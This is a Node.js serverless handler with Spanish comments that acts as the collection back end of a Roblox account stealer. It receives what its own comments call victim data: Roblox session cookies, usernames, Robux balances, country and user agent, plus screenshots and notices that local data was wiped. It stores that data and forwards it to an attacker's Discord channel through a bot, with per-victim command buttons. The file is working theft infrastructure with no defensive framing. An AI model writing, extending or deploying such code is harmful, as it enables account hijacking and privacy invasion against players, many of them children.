// api/log.js - VERSIÓN FINAL CON GUARDADO EN ARCHIVO
export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Max-Age', '86400');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;
    const baseUrl = `https://${req.headers.host}`;

    // Manejar captura de pantalla
    if (data.type === 'screenshot') {
        try {
            const base64Data = data.image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');

            const formData = new FormData();
            formData.append('file', new Blob([buffer]), 'screenshot.png');
            formData.append('payload_json', JSON.stringify({
                content: `📸 **CAPTURA DE PANTALLA RECIBIDA**\nUsuario: ${data.userId || 'Desconocido'}`
            }));

            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` },
                body: formData
            });
        } catch (error) {}
        return res.status(200).json({ status: 'ok' });
    }

    // Manejar limpieza
    if (data.type === 'cleanup') {
        try {
            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `🧹 **DATOS LOCALES ELIMINADOS**\nUsuario: ${data.userId || 'Desconocido'}\nEstado: ${data.message || 'Limpieza completada'}`
                })
            });
        } catch (error) {}
        return res.status(200).json({ status: 'ok' });
    }

    // ============================================================
    // GUARDAR DATOS DE LA VÍCTIMA EN ARCHIVO
    // ============================================================
    const userId = data.roblox?.userId || `anon_${Date.now()}`;

    const victimData = {
        roblox: {
            username: data.roblox?.username || 'No disponible',
            userId: data.roblox?.userId || 'No disponible',
            robux: data.roblox?.robux || 0,
            seguidores: data.roblox?.seguidores || 0,
            amigos: data.roblox?.amigos || 0,
            premium: data.roblox?.premium || 'No',
            verified: data.roblox?.verified || 'No',
            headless: data.roblox?.headless || 'No',
            korblox: data.roblox?.korblox || 'No'
        },
        cookie: data.cookie || 'No disponible',
        pais: data.pais || 'Desconocido',
        fecha: data.fecha || '',
        hora: data.hora || '',
        userAgent: data.userAgent || ''
    };

    // Guardar en /tmp usando fetch interno
    try {
        await fetch(`${baseUrl}/api/guardar`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, data: victimData })
        });
    } catch (error) {}

    // ============================================================
    // ENVIAR MENSAJE A DISCORD (SIN EMBED, SOLO TEXTO)
    // ============================================================
    const token = process.env.DISCORD_BOT_TOKEN;
    const channelId = process.env.DISCORD_CHANNEL_ID;

    if (!token || !channelId) {
        return res.status(500).json({ error: 'Config error' });
    }

    // Crear el mensaje con el NUEVO FORMATO (sin embed, solo texto)
    const mensaje = `||@everyone||

Selecciona una opcion:

[DISCORD]  [ROBLOX]
       [COMANDOS]`;

    // Botones
    const components = [
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 1,
                    label: 'DISCORD',
                    custom_id: `discord_${userId}`,
                    emoji: { name: '🔵' }
                },
                {
                    type: 2,
                    style: 1,
                    label: 'ROBLOX',
                    custom_id: `roblox_${userId}`,
                    emoji: { name: '®️' }
                }
            ]
        },
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 2,
                    label: ' COMANDOS',
                    custom_id: `comandos_${userId}`,
                    emoji: { name: '〰️' }
                }
            ]
        }
    ];

    try {
        const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: mensaje,
                components: components
            })
        });

        if (!response.ok) {
            return res.status(500).json({ error: 'Discord error' });
        }

        res.status(200).json({ status: 'ok', userId: userId });
        
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
}